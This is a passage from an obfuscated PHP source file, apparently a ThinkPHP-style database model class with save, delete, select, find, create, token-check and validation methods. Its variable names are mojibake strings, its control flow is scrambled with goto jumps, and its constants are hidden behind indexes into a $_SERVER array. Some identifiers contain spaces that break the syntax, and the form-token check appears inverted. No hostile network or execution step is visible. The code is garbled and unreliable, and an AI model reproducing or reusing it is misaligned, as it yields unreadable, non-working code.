$dº‰ƒ»éÁƒ); } else { $this->startTrans(); foreach ($d‹œ¿ùÍùŒ as $C Í™§›ô => $d„Ã­ìÜƒÀ) { $Cä‰ˆŠïçè = $this->db->insert($d„Ã­ìÜƒÀ, $b’®æÀ˜³ù, $dº‰ƒ»éÁƒ); } $this->commit(); } if (!1 !== $Cä‰ˆŠïçè) { $F¿Ô–Æ‚¨Ö = $this->getLastInsID(); if ($F¿Ô–Æ‚¨Ö) { return $F¿Ô–Æ‚¨Ö; } } goto Dóš¤Ì¢î; Dóš¤Ì¢î: return $Cä‰ˆŠïçè; goto e•‹ˆ‰ÃÛ; AôæˆËÊ÷: $dÙ‹¢…ëÏ =& $_SERVER[¿õñ]; if (empty($d‹œ¿ùÍùŒ)) { $this->error = think_lang($dÙ‹¢…ëÏ[256]); return !1; } $b’®æÀ˜³ù = $this->_parseOptions($b’®æÀ˜³ù); goto b½Üçù¾”õ; e•‹ˆ‰ÃÛ: } public function selectAdd($EËŞ±ŸìÏâ = '', $a‰Úîƒğğ‘ = '', $Båµí­Á˜Ä = array()) { $E«¥ÕƒéÆ© =& $_SERVER[¿õñ]; $Båµí­Á˜Ä = $this->_parseOptions($Båµí­Á˜Ä); if (!1 === ($A›Èì–îÛŒ = $this->db->selectInsert($EËŞ±ŸìÏâ ? $EËŞ±ŸìÏâ : $Båµí­Á˜Ä[$E«¥ÕƒéÆ©[258]], $a‰Úîƒğğ‘ ? $a‰Úîƒğğ‘ : $this->getTableName(), $Båµí­Á˜Ä))) { $this->error = think_lang($E«¥ÕƒéÆ©[259]); return !1; } else { return $A›Èì–îÛŒ; } } public function save($B¿‘ÌÆ°éî = '', $F…¯Å”×ÈÌ = array()) { goto Cñ‰§™É°; Cñ‰§™É°: $f“È¬Á¨åí =& $_SERVER[¿õñ]; if (empty($B¿‘ÌÆ°éî)) { if (!empty($this->data)) { $B¿‘ÌÆ°éî = $this->data; $this->data = array(); } else { $this->error = think_lang($f“È¬Á¨åí[256]); return !1; } } $B¿‘ÌÆ°éî = $this->_facade($B¿‘ÌÆ°éî); goto f¡¨ÓòùÓÊ; Aâó»²¨¹: if (!1 !== $BÕàÅ†Œê) { if (isset($bÜ‹¬‡«³¨)) { $B¿‘ÌÆ°éî[$AĞ¹ĞÓå·] = $bÜ‹¬‡«³¨; } $this->_afterUpdate($B¿‘ÌÆ°éî, $F…¯Å”×ÈÌ); } return $BÕàÅ†Œê; goto d±õˆ àËí; f¡¨ÓòùÓÊ: $F…¯Å”×ÈÌ = $this->_parseOptions($F…¯Å”×ÈÌ); $AĞ¹ĞÓå· = $this->getPk(); if (!isset($F…¯Å”×ÈÌ[$f“È¬Á¨åí[260]])) { if (isset($B¿‘ÌÆ°éî[$AĞ¹ĞÓå·])) { $Dš÷ĞÛ–ˆ²[$AĞ¹ĞÓå·] = $B¿‘ÌÆ°éî[$AĞ¹ĞÓå·]; $F…¯Å”×ÈÌ[$f“È¬Á¨åí[260]] = $Dš÷ĞÛ–ˆ²; unset($B¿‘ÌÆ°éî[$AĞ¹ĞÓå·]); } else { $this->error = think_lang($f“È¬Á¨åí[259]); return !1; } } goto eŞªêğÃ•; eŞªêğÃ•: if (is_array($F…¯Å”×ÈÌ[$f“È¬Á¨åí[260]]) && isset($F…¯Å”×ÈÌ[$f“È¬Á¨åí[260]][$AĞ¹ĞÓå·])) { $bÜ‹¬‡«³¨ = $F…¯Å”×ÈÌ[$f“È¬Á¨åí[260]][$AĞ¹ĞÓå·]; } if (!1 === $this->_beforeUpdate($B¿‘ÌÆ°éî, $F…¯Å”×ÈÌ)) { return !1; } $BÕàÅ†Œê = $this->db->update($B¿‘ÌÆ°éî, $F…¯Å”×ÈÌ); goto Aâó»²¨¹; d±õˆ àËí: } protected function _beforeUpdate(&$Câ’éìÂ‡‚, $B¥ÂËŒ†˜¾) { } protected function _afterUpdate($cİßŒÏÄÔˆ, $c­¬Ìï¸—×) { } public function delete($dñ¶ùà‡± = array()) { goto fÍÆ‚‰Êñ•; AŞ§ôÆ˜Å†: $EŠÎöàËÓ¶ = $this->db->delete($dñ¶ùà‡±); if (!1 !== $EŠÎöàËÓ¶) { $ağëè·Ùà = array(); if (isset($Aé°î¿ŒŞï)) { $ağëè·Ùà[$fÎ£Ú÷ô] = $Aé°î¿ŒŞï; } $this->_after_delete($ağëè·Ùà, $dñ¶ùà‡±); } return $EŠÎöàËÓ¶; goto f·Êµ„ñ‚; aö¼æ÷ÅŸ¤: if (is_numeric($dñ¶ùà‡±) || is_string($dñ¶ùà‡±)) { if (strpos($dñ¶ùà‡±, $b¥í¾½áëË[47])) { $bÑµ±±©£[$fÎ£Ú÷ô] = array($b¥í¾½áëË[261], $dñ¶ùà‡±); } else { $bÑµ±±©£[$fÎ£Ú÷ô] = $dñ¶ùà‡±; } $this->options[$b¥í¾½áëË[260]] = $bÑµ±±©£; } $dñ¶ùà‡± = $this->_parseOptions(); if (is_array($dñ¶ùà‡±[$b¥í¾½áëË[260]]) && isset($dñ¶ùà‡±[$b¥í¾½áëË[260]][$fÎ£Ú÷ô])) { $Aé°î¿ŒŞï = $dñ¶ùà‡±[$b¥í¾½áëË[260]][$fÎ£Ú÷ô]; } goto AŞ§ôÆ˜Å†; fÍÆ‚‰Êñ•: $b¥í¾½áëË =& $_SERVER[¿õñ]; if (empty($dñ¶ùà‡±) && empty($this->options[$b¥í¾½áëË[260]])) { if (!empty($this->data) && isset($this->data[$this->getPk()])) { return $this->delete($this->data[$this->getPk()]); } else { return !1; } } $fÎ£Ú÷ô = $this->getPk(); goto aö¼æ÷ÅŸ¤; f·Êµ„ñ‚: } protected function _after_delete($aÜõ„Ç½œ, $Cô¤‚âàå) { } public function select($b•ƒ¿àŞ÷¸ = array()) { goto c¤£æŞà®Ä; A¹¸Çö’Ñ: $this->_afterSelect($aİªî¬é‘¥, $b•ƒ¿àŞ÷¸); return $aİªî¬é‘¥; goto cĞÄ¸‹¿; Eç‹ÑÍ¹É¬: $aİªî¬é‘¥ = $this->db->select($b•ƒ¿àŞ÷¸); if (!1 === $aİªî¬é‘¥) { return !1; } if (empty($aİªî¬é‘¥)) { return null; } goto A¹¸Çö’Ñ; c¤£æŞà®Ä: $BÜØÌÙñ“£ =& $_SERVER[¿õñ]; if (is_string($b•ƒ¿àŞ÷¸) || is_numeric($b•ƒ¿àŞ÷¸)) { $f—„Ñ™¤åÄ = $this->getPk(); if (strpos($b•ƒ¿àŞ÷¸, $BÜØÌÙñ“£[47])) { $Bƒœ—‚“¹’[$f—„Ñ™¤åÄ] = array($BÜØÌÙñ“£[261], $b•ƒ¿àŞ÷¸); } else { $Bƒœ—‚“¹’[$f—„Ñ™¤åÄ] = $b•ƒ¿àŞ÷¸; } $this->options[$BÜØÌÙñ“£[260]] = $Bƒœ—‚“¹’; } elseif (!1 === $b•ƒ¿àŞ÷¸) { $b•ƒ¿àŞ÷¸ = $this->_parseOptions(); return $BÜØÌÙñ“£[262] . $this->db->buildSelectSql($b•ƒ¿àŞ÷¸) . $BÜØÌÙñ“£[263]; } $b•ƒ¿àŞ÷¸ = $this->_parseOptions(); goto Eç‹ÑÍ¹É¬; cĞÄ¸‹¿: } protected function _afterSelect(&$dôâµ”à¦º, $cóøòêÍäá) { } public function buildSql($F’çÙ­šÕ¾ = array()) { $D¶„òÃèâ =& $_SERVER[¿õñ]; $F’çÙ­šÕ¾ = $this->_parseOptions($F’çÙ­šÕ¾); return $D¶„òÃèâ[262] . $this->db->buildSelectSql($F’çÙ­šÕ¾) . $D¶„òÃèâ[263]; } public function optionsValue($CÕ…†ëåÅ = null) { if (is_null($CÕ…†ëåÅ)) { return $this->options; } elseif (is_array($CÕ…†ëåÅ)) { $this->options = array_merge($this->options, $CÕ…†ëåÅ); } } protected function _parseOptions($Eä•˜±‘± = array()) { goto AøÑÄŸæÖã; a•Å‰„¬«: if (isset($Eä•˜±‘±[$e£Ô¹œÂ¼[260]]) && is_array($Eä•˜±‘±[$e£Ô¹œÂ¼[260]]) && !empty($dùò·¹½ƒ) && !isset($Eä•˜±‘±[$e£Ô¹œÂ¼[267]]) && !isset($Eä•˜±‘±[$e£Ô¹œÂ¼[264]])) { foreach ($Eä•˜±‘±[$e£Ô¹œÂ¼[260]] as $aÓò…ÙÌ° => $dÃë÷ ÕÜ) { $aÓò…ÙÌ° = trim($aÓò…ÙÌ°); if (in_array($aÓò…ÙÌ°, $dùò·¹½ƒ, !0)) { if (is_scalar($dÃë÷ ÕÜ)) { $this->_parseType($Eä•˜±‘±[$e£Ô¹œÂ¼[260]], $aÓò…ÙÌ°); } } elseif (!is_numeric($aÓò…ÙÌ°) && $e£Ô¹œÂ¼[71] != substr($aÓò…ÙÌ°, 0, 1) && !1 === strpos($aÓò…ÙÌ°, $e£Ô¹œÂ¼[92]) && !1 === strpos($aÓò…ÙÌ°, $e£Ô¹œÂ¼[245]) && !1 === strpos($aÓò…ÙÌ°, $e£Ô¹œÂ¼[268]) && !1 === strpos($aÓò…ÙÌ°, $e£Ô¹œÂ¼[269])) { unset($Eä•˜±‘±[$e£Ô¹œÂ¼[260]][$aÓò…ÙÌ°]); } } } $this->_options_filter($Eä•˜±‘±); return $Eä•˜±‘±; goto dÌ¦‹‚¼Ã; A„›‡º†Ö: if (!isset($Eä•˜±‘±[$e£Ô¹œÂ¼[264]])) { $Eä•˜±‘±[$e£Ô¹œÂ¼[264]] = $this->getTableName(); $dùò·¹½ƒ = $this->fields; } else { $dùò·¹½ƒ = $this->getDbFields(); } if (!empty($Eä•˜±‘±[$e£Ô¹œÂ¼[265]])) { $Eä•˜±‘±[$e£Ô¹œÂ¼[264]] .= $e£Ô¹œÂ¼[50] . $Eä•˜±‘±[$e£Ô¹œÂ¼[265]]; } $Eä•˜±‘±[$e£Ô¹œÂ¼[266]] = $this->name; goto a•Å‰„¬«; AøÑÄŸæÖã: $e£Ô¹œÂ¼ =& $_SERVER[¿õñ]; if (is_array($Eä•˜±‘±)) { $Eä•˜±‘± = array_merge($this->options, $Eä•˜±‘±); } $this->options = array(); goto A„›‡º†Ö; dÌ¦‹‚¼Ã: } protected function _options_filter(&$b¨´Ì…ö§å) { } protected function _parseType(&$d÷†¯ÄÚ ª, $A¬¸èõñ‹Ï) { $c·åŠ´éÊß =& $_SERVER[¿õñ]; if (empty($this->options[$c·åŠ´éÊß[270]][$c·åŠ´éÊß[4] . $A¬¸èõñ‹Ï])) { $Bìê¸ßß¹… = strtolower($this->fields[$c·åŠ´éÊß[237]][$A¬¸èõñ‹Ï]); if (!1 !== strpos($Bìê¸ßß¹…, $c·åŠ´éÊß[271])) { } elseif (!1 === strpos($Bìê¸ßß¹…, $c·åŠ´éÊß[272]) && !1 !== strpos($Bìê¸ßß¹…, $c·åŠ´éÊß[273])) { $d÷†¯ÄÚ ª[$A¬¸èõñ‹Ï] = intval($d÷†¯ÄÚ ª[$A¬¸èõñ‹Ï]); } elseif (!1 !== strpos($Bìê¸ßß¹…, $c·åŠ´éÊß[274]) || !1 !== strpos($Bìê¸ßß¹…, $c·åŠ´éÊß[275])) { $d÷†¯ÄÚ ª[$A¬¸èõñ‹Ï] = floatval($d÷†¯ÄÚ ª[$A¬¸èõñ‹Ï]); } elseif (!1 !== strpos($Bìê¸ßß¹…, $c·åŠ´éÊß[276])) { $d÷†¯ÄÚ ª[$A¬¸èõñ‹Ï] = (bool) $d÷†¯ÄÚ ª[$A¬¸èõñ‹Ï]; } } } public function find($c«ù‰Ìöë« = array()) { goto c„Ğ‡ÎŸ­; cİª™”¾Â: if (!empty($this->options[$bİ¡ôù›—®[278]])) { return $this->returnResult($this->data, $this->options[$bİ¡ôù›—®[278]]); } return $this->data; goto D¬§çƒ‡´ ; D£ò†öÄÒ: $c«ù‰Ìöë« = $this->_parseOptions(); $BãßÒêé«Ø = $this->db->select($c«ù‰Ìöë«); if (!1 === $BãßÒêé«Ø) { return !1; } goto fÕ¢›æ„ò; fÕ¢›æ„ò: if (empty($BãßÒêé«Ø)) { return null; } $this->data = $BãßÒêé«Ø[0]; $this->_afterFind($this->data, $c«ù‰Ìöë«); goto cİª™”¾Â; c„Ğ‡ÎŸ­: $bİ¡ôù›—® =& $_SERVER[¿õñ]; if (is_numeric($c«ù‰Ìöë«) || is_string($c«ù‰Ìöë«)) { $B¦Ì•÷ŠÜÛ[$this->getPk()] = $c«ù‰Ìöë«; $this->options[$bİ¡ôù›—®[260]] = $B¦Ì•÷ŠÜÛ; } $this->options[$bİ¡ôù›—®[277]] = 1; goto D£ò†öÄÒ; D¬§çƒ‡´ : } protected function _afterFind(&$D„”ÑÆµĞ, $a­ˆ¥®ù‡ã) { } protected function returnResult($AÈåĞÊ—ŠŠ, $CêÉÆ®ÇÒœ = '') { $dŠÃÌ¾Å³ =& $_SERVER[¿õñ]; if ($CêÉÆ®ÇÒœ) { if (is_callable($CêÉÆ®ÇÒœ)) { return call_user_func($CêÉÆ®ÇÒœ, $AÈåĞÊ—ŠŠ); } switch (strtolower($CêÉÆ®ÇÒœ)) { case $dŠÃÌ¾Å³[279]: return json_encode($AÈåĞÊ—ŠŠ); case $dŠÃÌ¾Å³[280]: return xml_encode($AÈåĞÊ—ŠŠ); } } return $AÈåĞÊ—ŠŠ; } public function parseFieldsMap($bñ”É›¯Í¶, $A§Ù­İ’•Ú = 1) { if (!empty($this->_map)) { foreach ($this->_map as $f³øíÜİ˜ => $DòÃÏ‚Ú•š) { if ($A§Ù­İ’•Ú == 1) { if (isset($bñ”É›¯Í¶[$DòÃÏ‚Ú•š])) { $bñ”É›¯Í¶[$f³øíÜİ˜] = $bñ”É›¯Í¶[$DòÃÏ‚Ú•š]; unset($bñ”É›¯Í¶[$DòÃÏ‚Ú•š]); } } else { if (isset($bñ”É›¯Í¶[$f³øíÜİ˜])) { $bñ”É›¯Í¶[$DòÃÏ‚Ú•š] = $bñ”É›¯Í¶[$f³øíÜİ˜]; unset($bñ”É›¯Í¶[$f³øíÜİ˜]); } } } } return $bñ”É›¯Í¶; } public function setField($C÷§×¸øÉ¼, $e«¹«Çƒ™Ô = '') { if (is_array($C÷§×¸øÉ¼)) { $c¨Ñ‹ŠÉ¥ = $C÷§×¸øÉ¼; } else { $c¨Ñ‹ŠÉ¥[$C÷§×¸øÉ¼] = $e«¹«Çƒ™Ô; } return $this->save($c¨Ñ‹ŠÉ¥); } public function setAdd($DÚ¯ÔĞòò, $c†µ¦Ù°Ò· = 1) { $Cò»¼ƒ‰™ø =& $_SERVER[¿õñ]; $Bõ«Ğ½÷Å‚ = $DÚ¯ÔĞòò . $Cò»¼ƒ‰™ø[281] . $c†µ¦Ù°Ò·; if ($c†µ¦Ù°Ò· < 0) { $Bõ«Ğ½÷Å‚ = $DÚ¯ÔĞòò . $c†µ¦Ù°Ò·; } return $this->setField($DÚ¯ÔĞòò, array($Cò»¼ƒ‰™ø[282], $Bõ«Ğ½÷Å‚)); } public function getField($DßÆÃĞ©Æ, $eÛåŠ¡Œñ„ = null) { $Cˆí‹ÉŠ°÷ =& $_SERVER[¿õñ]; $DÜˆ†ÓªèÁ[$Cˆí‹ÉŠ°÷[258]] = $DßÆÃĞ©Æ; $DÜˆ†ÓªèÁ = $this->_parseOptions($DÜˆ†ÓªèÁ); $DßÆÃĞ©Æ = trim($DßÆÃĞ©Æ); if (strpos($DßÆÃĞ©Æ, $Cˆí‹ÉŠ°÷[47])) { if (!isset($DÜˆ†ÓªèÁ[$Cˆí‹ÉŠ°÷[277]])) { $DÜˆ†ÓªèÁ[$Cˆí‹ÉŠ°÷[277]] = is_numeric($eÛåŠ¡Œñ„) ? $eÛåŠ¡Œñ„ : $Cˆí‹ÉŠ°÷[33]; } $Dá†¸ØÍŸñ = $this->db->select($DÜˆ†ÓªèÁ); if (!empty($Dá†¸ØÍŸñ)) { goto B¢»Æ¡ß§; B¢»Æ¡ß§: $Bé¨Ó³Ì‚ã = explode($Cˆí‹ÉŠ°÷[47], $DßÆÃĞ©Æ); $DßÆÃĞ©Æ = array_keys($Dá†¸ØÍŸñ[0]); $f‚ëÑøö¾Ì = array_shift($DßÆÃĞ©Æ); goto EŸ™¢¹ƒ¶‚; EŸ™¢¹ƒ¶‚: $dã‘¤¡¡·Ä = array_shift($DßÆÃĞ©Æ); $eÓÓÛ•Œªİ = array(); $AéğğÄ†À” = count($Bé¨Ó³Ì‚ã); goto a‰¶¹®Úéğ; a‰¶¹®Úéğ: foreach ($Dá†¸ØÍŸñ as $e±‰•ÚËñÎ) { $f²Á–»Ï‘ = $e±‰•ÚËñÎ[$f‚ëÑøö¾Ì]; if (2 == $AéğğÄ†À”) { $eÓÓÛ•Œªİ[$f²Á–»Ï‘] = $e±‰•ÚËñÎ[$dã‘¤¡¡·Ä]; } else { $eÓÓÛ•Œªİ[$f²Á–»Ï‘] = is_string($eÛåŠ¡Œñ„) ? implode($eÛåŠ¡Œñ„, $e±‰•ÚËñÎ) : $e±‰•ÚËñÎ; } } return $eÓÓÛ•Œªİ; goto b´âø•¨¿ß; b´âø•¨¿ß: } } else { if (!0 !== $eÛåŠ¡Œñ„) { $DÜˆ†ÓªèÁ[$Cˆí‹ÉŠ°÷[277]] = is_numeric($eÛåŠ¡Œñ„) ? $eÛåŠ¡Œñ„ : 1; } if ($eÛåŠ¡Œñ„ === $Cˆí‹ÉŠ°÷[240]) { unset($DÜˆ†ÓªèÁ[$Cˆí‹ÉŠ°÷[277]]); } $e±‰•ÚËñÎ = $this->db->select($DÜˆ†ÓªèÁ); if (!empty($e±‰•ÚËñÎ)) { if ($eÛåŠ¡Œñ„ === $Cˆí‹ÉŠ°÷[240]) { return reset($e±‰•ÚËñÎ[0]); } if (!0 !== $eÛåŠ¡Œñ„ && 1 == $DÜˆ†ÓªèÁ[$Cˆí‹ÉŠ°÷[277]]) { return reset($e±‰•ÚËñÎ[0]); } foreach ($e±‰•ÚËñÎ as $c›ÅÇëò‘) { $bˆíÒé™›[] = $c›ÅÇëò‘[$DßÆÃĞ©Æ]; } return $bˆíÒé™›; } } return null; } public function create($AÌ¤Ş‚‡£Œ = '', $fßªê«›‰ = '') { goto fÙ›ÛºË³Ì; fºÙŒ‘ğğ†: $AÌ¤Ş‚‡£Œ = $this->parseFieldsMap($AÌ¤Ş‚‡£Œ, 0); $fßªê«›‰ = $fßªê«›‰ ? $fßªê«›‰ : (!empty($AÌ¤Ş‚‡£Œ[$this->getPk()]) ? THINK_MODEL_UPDATE : THINK_MODEL_INSERT); if (isset($this->options[$bŸ”ƒ²‘Àœ[258]])) { $Aª«Ÿ¦Œ = $this->options[$bŸ”ƒ²‘Àœ[258]]; unset($this->options[$bŸ”ƒ²‘Àœ[258]]); } elseif ($fßªê«›‰ == THINK_MODEL_INSERT && isset($this->insertFields)) { $Aª«Ÿ¦Œ = $this->insertFields; } elseif ($fßªê«›‰ == THINK_MODEL_UPDATE && isset($this->updateFields)) { $Aª«Ÿ¦Œ = $this->updateFields; } goto e¨îßŞöÏ¢; cÃ¦Ü™“¬†: return $AÌ¤Ş‚‡£Œ; goto cÕì’Ê£é†; fÙ›ÛºË³Ì: $bŸ”ƒ²‘Àœ =& $_SERVER[¿õñ]; if (empty($AÌ¤Ş‚‡£Œ)) { $AÌ¤Ş‚‡£Œ = $_POST; } elseif (is_object($AÌ¤Ş‚‡£Œ)) { $AÌ¤Ş‚‡£Œ = get_object_vars($AÌ¤Ş‚‡£Œ); } if (empty($AÌ¤Ş‚‡£Œ) || !is_array($AÌ¤Ş‚‡£Œ)) { $this->error = think_lang($bŸ”ƒ²‘Àœ[256]); return !1; } goto fºÙŒ‘ğğ†; EÂÏ­Ë¸Ê: if ($this->autoCheckFields) { $Aª«Ÿ¦Œ = $this->getDbFields(); foreach ($AÌ¤Ş‚‡£Œ as $DƒÌíåÚ => $böô„©Š¹…) { if (!in_array($DƒÌíåÚ, $Aª«Ÿ¦Œ)) { unset($AÌ¤Ş‚‡£Œ[$DƒÌíåÚ]); } elseif (MAGIC_QUOTES_GPC && is_string($böô„©Š¹…)) { $AÌ¤Ş‚‡£Œ[$DƒÌíåÚ] = stripslashes($böô„©Š¹…); } } } $this->autoOperation($AÌ¤Ş‚‡£Œ, $fßªê«›‰); $this->data = $AÌ¤Ş‚‡£Œ; goto cÃ¦Ü™“¬†; e¨îßŞöÏ¢: if (isset($Aª«Ÿ¦Œ)) { if (is_string($Aª«Ÿ¦Œ)) { $Aª«Ÿ¦Œ = explode($bŸ”ƒ²‘Àœ[47], $Aª«Ÿ¦Œ); } if (think_config($bŸ”ƒ²‘Àœ[283])) { $Aª«Ÿ¦Œ[] = think_config($bŸ”ƒ²‘Àœ[284]); } foreach ($AÌ¤Ş‚‡£Œ as $DƒÌíåÚ => $böô„©Š¹…) { if (!in_array($DƒÌíåÚ, $Aª«Ÿ¦Œ)) { unset($AÌ¤Ş‚‡£Œ[$DƒÌíåÚ]); } } } if (!$this->autoValidation($AÌ¤Ş‚‡£Œ, $fßªê«›‰)) { return !1; } if (!$this->autoCheckToken($AÌ¤Ş‚‡£Œ)) { $this->error = think_lang($bŸ”ƒ²‘Àœ[285]); return !1; } goto EÂÏ­Ë¸Ê; cÕì’Ê£é†: } public function autoCheckToken($FÎ‚ŠÓ©¾‡) { $a±Ê†‚“‚á =& $_SERVER[¿õñ]; if (isset($this->options[$a±Ê†‚“‚á[286]]) && !$this->options[$a±Ê†‚“‚á[286]]) { return !0; } if (think_config($a±Ê†‚“‚á[283])) { $Aî²Éå¼ì = think_config($a±Ê†‚“‚á[284]); if (!isset($FÎ‚ŠÓ©¾‡[$Aî²Éå¼ì]) || Session::get($Aî²Éå¼ì)) { return !1; } list($fÓ–†»¶Ñâ, $B¦À‘ğÌÉÁ) = explode($a±Ê†‚“‚á[71], $FÎ‚ŠÓ©¾‡[$Aî²Éå¼ì]); if ($B¦À‘ğÌÉÁ && Session::get($Aî²Éå¼ì . $a±Ê†‚“‚á[92] . $fÓ–†»¶Ñâ) === $B¦À‘ğÌÉÁ) { Session::remove($Aî²Éå¼ì . $a±Ê†‚“‚á[92] . $fÓ–†»¶Ñâ); return !0; } if (think_config($a±Ê†‚“‚á[287])) { Session::remove($Aî²Éå¼ì . $a±Ê†‚“‚á[92] . $fÓ–†»¶Ñâ); } return !1; } return !0; } public function regex($e‘Äâì›ÄÖ, $D˜óÀ™È‹Ã) { $D­¿ÈÌ¾ =& $_SERVER[¿õñ]; $dšäÎ´í¶ = array($D­¿ÈÌ¾[288] => $D­¿ÈÌ¾[289], $D­¿ÈÌ¾[290] => $D­¿ÈÌ¾[291], $D­¿ÈÌ¾[292] => $D­¿ÈÌ¾[293], $D­¿ÈÌ¾[294] => $D­¿ÈÌ¾[295], $D­¿ÈÌ¾[296] => $D­¿ÈÌ¾[297], $D­¿ÈÌ¾[298] => $D­¿ÈÌ¾[299], $D­¿ÈÌ¾[300] => $D­¿ÈÌ¾[301], $D­¿ÈÌ¾[275] => $D­¿ÈÌ¾[302], $D­¿ÈÌ¾[303] => $D­¿ÈÌ¾[304]); if (isset($dšäÎ´í¶[strtolower($D˜óÀ™È‹Ã)])) { $D˜óÀ™È‹Ã = $dšäÎ´í¶[strtolower($D˜óÀ™È‹Ã)]; } return preg_match($D˜óÀ™È‹Ã, $e‘Äâì›ÄÖ) === 1; } private function autoOperation(&$D‰ªò¦Ó¯, $Aïå§ä«òµ) { $e³ÌàÎ©œÁ =& $_SERVER[¿õñ]; if (!empty($this->options[$e³ÌàÎ©œÁ[305]])) { $b…åƒ‘ïÉ = $this->options[$e³ÌàÎ©œÁ[305]]; unset($this->options[$e³ÌàÎ©œÁ[305]]); } elseif (!empty($this->_auto)) { $b…åƒ‘ïÉ = $this->_auto; } if (isset($b…åƒ‘ïÉ)) { foreach ($b…åƒ‘ïÉ as $Eì¶·Ö…Ø´) { if (empty($Eì¶·Ö…Ø´[2])) { $Eì¶·Ö…Ø´[2] = THINK_MODEL_INSERT; } if ($Aïå§ä«òµ == $Eì¶·Ö…Ø´[2] || $Eì¶·Ö…Ø´[2] == THINK_MODEL_BOTH) { switch (trim($Eì¶·Ö…Ø´[3])) { case $e³ÌàÎ©œÁ[306]: case $e³ÌàÎ©œÁ[307]: $AåÊí¿Âö = isset($Eì¶·Ö…Ø´[4]) ? (array) $Eì¶·Ö…Ø´[4] : array(); if (isset($D‰ªò¦Ó¯[$Eì¶·Ö…Ø´[0]])) { array_unshift($AåÊí¿Âö, $D‰ªò¦Ó¯[$Eì¶·Ö…Ø´[0]]); } if ($e³ÌàÎ©œÁ[306] == $Eì¶·Ö…Ø´[3]) { $D‰ªò¦Ó¯[$Eì¶·Ö…Ø´[0]] = call_user_func_array($Eì¶·Ö…Ø´[1], $AåÊí¿Âö); } else { $D‰ªò¦Ó¯[$Eì¶·Ö…Ø´[0]] = call_user_func_array(array(&$this, $Eì¶·Ö…Ø´[1]), $AåÊí¿Âö); } break; case $e³ÌàÎ©œÁ[258]: $D‰ªò¦Ó¯[$Eì¶·Ö…Ø´[0]] = $D‰ªò¦Ó¯[$Eì¶·Ö…Ø´[1]]; break; case $e³ÌàÎ©œÁ[308]: if ($e³ÌàÎ©œÁ[33] === $D‰ªò¦Ó¯[$Eì¶·Ö…Ø´[0]]) { unset($D‰ªò¦Ó¯[$Eì¶·Ö…Ø´[0]]); } break; case $e³ÌàÎ©œÁ[309]: default: $D‰ªò¦Ó¯[$Eì¶·Ö…Ø´[0]] = $Eì¶·Ö…Ø´[1]; } if (!1 === $D‰ªò¦Ó¯[$Eì¶·Ö…Ø´[0]]) { unset($D‰ªò¦Ó¯[$Eì¶·Ö…Ø´[0]]); } } } } return $D‰ªò¦Ó¯; } protected function autoValidation($BĞ¡¿ˆœø®, $A£¹Ö¦÷ôÚ) { $aà²¤¨¿‚ =& $_SERVER[¿õñ]; if (!empty($this->options[$aà²¤¨¿‚[310]])) { $A‘Öˆ’Ú‚ = $this->options[$aà²¤¨¿‚[310]]; unset($this->options[$aà²¤¨¿‚[310]]); } elseif (!empty($this->_validate)) { $A‘Öˆ’Ú‚ = $this->_validate; } if (isset($A‘Öˆ’Ú‚)) { if ($this->patchValidate) { $this->error = array(); } foreach ($A‘Öˆ’Ú‚ as $dïà­éç¸ => $B­ä‰ìğÙ¿) { if (empty($B­ä‰ìğÙ¿[5]) || $B­ä‰ìğÙ¿[5] == THINK_MODEL_BOTH || $B­ä‰ìğÙ¿[5] == $A£¹Ö¦÷ôÚ) { if (0 == strpos($B­ä‰ìğÙ¿[2], $aà²¤¨¿‚[311]) && strpos($B­ä‰ìğÙ¿[2], $aà²¤¨¿‚[312])) { $B­ä‰ìğÙ¿[2] = think_lang(substr($B­ä‰ìğÙ¿[2], 2, -1)); } $B­ä‰ìğÙ¿[3] = isset($B­ä‰ìğÙ¿[3]) ? $B­ä‰ìğÙ¿[3] : THINK_EXISTS_VALIDATE; $B­ä‰ìğÙ¿[4] = isset($B­ä‰ìğÙ¿[4]) ? $B­ä‰ìğÙ¿[4] : $aà²¤¨¿‚[313]; switch ($B­ä‰ìğÙ¿[3]) { case THINK_MUST_VALIDATE: if (!1 === $this->_validationField($BĞ¡¿ˆœø®, $B­ä‰ìğÙ¿)) { return !1; } break; case THINK_VALUE_VALIDATE: if ($aà²¤¨¿‚[33] != trim($BĞ¡¿ˆœø®[$B­ä‰ìğÙ¿[0]])) { if (!1 === $this->_validationField($BĞ¡¿ˆœø®, $B­ä‰ìğÙ¿)) { return !1; } } break; default: if (isset($BĞ¡¿ˆœø®[$B­ä‰ìğÙ¿[0]])) { if (!1 === $this->_validationField($BĞ¡¿ˆœø®, $B­ä‰ìğÙ¿)) { return !1; } } } } } if (!empty($this->error)) { return !1; } } return !0; } protected function _validationField($d‰ù›¬ñƒ, $C×š‹Û…£à) { if (!1 === $this->_validationFieldItem($d‰ù›¬ñƒ, $C×š‹Û…£à)) { if ($this->patchValidate) { $this->error[$C×š‹Û…£à[0]] = $C×š‹Û…£à[2]; } else { $this->error = $C×š‹Û…£à[2]; return !1; } } return; } protected function _validationFieldItem($AÓóÃÔ§¦ø, $f®éò¼¡Å) { $C°¯“À”³ =& $_SERVER[¿õñ]; switch (strtolower(trim($f®éò¼¡Å[4]))) { case $C°¯“À”³[306]: case $C°¯“À”³[307]: $DÎè°¨™¼• = isset($f®éò¼¡Å[6]) ? (array) $f®éò¼¡Å[6] : array(); if (is_string($f®éò¼¡Å[0]) && strpos($f®éò¼¡Å[0], $C°¯“À”³[47])) { $f®éò¼¡Å[0] = explode($C°¯“À”³[47], $f®éò¼¡Å[0]); } if (is_array($f®éò¼¡Å[0])) { foreach ($f®éò¼¡Å[0] as $aá÷î‚Ü¹) { $eİ‹¯ã •[$aá÷î‚Ü¹] = $AÓóÃÔ§¦ø[$aá÷î‚Ü¹]; } array_unshift($DÎè°¨™¼•, $eİ‹¯ã •); } else { array_unshift($DÎè°¨™¼•, $AÓóÃÔ§¦ø[$f®éò¼¡Å[0]]); } if ($C°¯“À”³[306] == $f®éò¼¡Å[4]) { return call_user_func_array($f®éò¼¡Å[1], $DÎè°¨™¼•); } else { return call_user_func_array(array(&$this, $f®éò¼¡Å[1]), $DÎè°¨™¼•); } case $C°¯“À”³[314]: return $AÓóÃÔ§¦ø[$f®éò¼¡Å[0]] == $AÓóÃÔ§¦ø[$f®éò¼¡Å[1]]; case $C°¯“À”³[315]: if (is_string($f®éò¼¡Å[0]) && strpos($f®éò¼¡Å[0], $C°¯“À”³[47])) { $f®éò¼¡Å[0] = explode($C°¯“À”³[47], $f®éò¼¡Å[0]); } $d‘ÊËÀèÆ¯ = array(); if (is_array($f®éò¼¡Å[0])) { foreach ($f®éò¼¡Å[0] as $aá÷î‚Ü¹) { $d‘ÊËÀèÆ¯[$aá÷î‚Ü¹] = 